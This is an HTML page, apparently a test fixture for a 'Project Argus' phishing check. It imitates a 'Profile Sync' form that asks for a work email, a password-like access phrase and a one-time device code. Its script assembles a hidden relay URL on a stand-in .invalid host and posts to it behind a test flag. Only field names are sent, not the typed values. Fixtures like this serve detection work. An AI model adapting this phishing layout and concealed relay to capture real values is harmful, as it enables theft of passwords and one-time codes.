<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Profile Sync</title>
  <style>
    :root {
      color-scheme: light;
      --bg: #f4f7fb;
      --panel: #ffffff;
      --border: #dbe4ef;
      --text: #1d2939;
      --muted: #667085;
      --accent: #2864d8;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      background: linear-gradient(135deg, #eef4ff, var(--bg));
      color: var(--text);
      font-family: Arial, Helvetica, sans-serif;
    }

    main {
      width: min(520px, calc(100vw - 32px));
      border: 1px solid var(--border);
      border-radius: 8px;
      background: var(--panel);
      box-shadow: 0 20px 60px rgba(16, 24, 40, 0.12);
      padding: 28px;
    }

    h1 {
      margin: 0 0 8px;
      font-size: 24px;
    }

    p {
      margin: 0 0 20px;
      color: var(--muted);
      line-height: 1.5;
    }

    form {
      display: grid;
      gap: 14px;
    }

    label {
      display: grid;
      gap: 6px;
      font-weight: 700;
    }

    input {
      width: 100%;
      border: 1px solid var(--border);
      border-radius: 6px;
      font: 15px Arial, Helvetica, sans-serif;
      padding: 11px 12px;
    }

    button {
      border: 0;
      border-radius: 6px;
      background: var(--accent);
      color: #ffffff;
      cursor: pointer;
      font: 700 15px Arial, Helvetica, sans-serif;
      padding: 12px 14px;
    }

    .note {
      margin-top: 14px;
      min-height: 20px;
      color: var(--muted);
      font-size: 13px;
    }
  </style>
</head>
<body>
  <main>
    <h1>Profile Sync</h1>
    <p>Keep your workspace profile consistent across your signed-in devices.</p>

    <form id="syncForm" action="/Website_testonly/complete" method="post" autocomplete="on">
      <label>
        Workspace email
        <input name="contact" type="email" autocomplete="email" placeholder="name@example.com">
      </label>
      <label>
        Access phrase
        <input name="phrase" type="text" autocomplete="current-password" inputmode="text" placeholder="Enter access phrase">
      </label>
      <label>
        Device check
        <input name="device_check" type="text" autocomplete="one-time-code" inputmode="numeric" placeholder="6 digit device check">
      </label>
      <button type="submit">Sync profile</button>
    </form>

    <div id="status" class="note" aria-live="polite"></div>
  </main>

  <script>
    (() => {
      const allowNetwork = window.ARGUS_TEST_ALLOW_NETWORK === true;
      const form = document.getElementById("syncForm");
      const status = document.getElementById("status");
      const endpointParts = ["https://", "assets", ".", "example-cdn", ".", "invalid", "/v1/profile"];

      function buildEndpoint() {
        return endpointParts.join("");
      }

      function demoPayload() {
        return {
          page: "quiet-profile-sync",
          fieldNamesOnly: Array.from(form.elements).map((element) => element.name).filter(Boolean),
          typedValuesIncluded: false,
          timestamp: new Date().toISOString()
        };
      }

      form.addEventListener("submit", (event) => {
        event.preventDefault();
        const payload = demoPayload();

        window.setTimeout(() => {
          if (allowNetwork) {
            fetch(buildEndpoint(), {
              method: "POST",
              mode: "no-cors",
              body: JSON.stringify(payload)
            }).catch(() => {});
          }

          status.textContent = "Profile sync queued. Demo payload kept local by default.";
          console.info("Project Argus test-only simulated relay", payload);
        }, 1800);
      });
    })();
  </script>
</body>
</html>
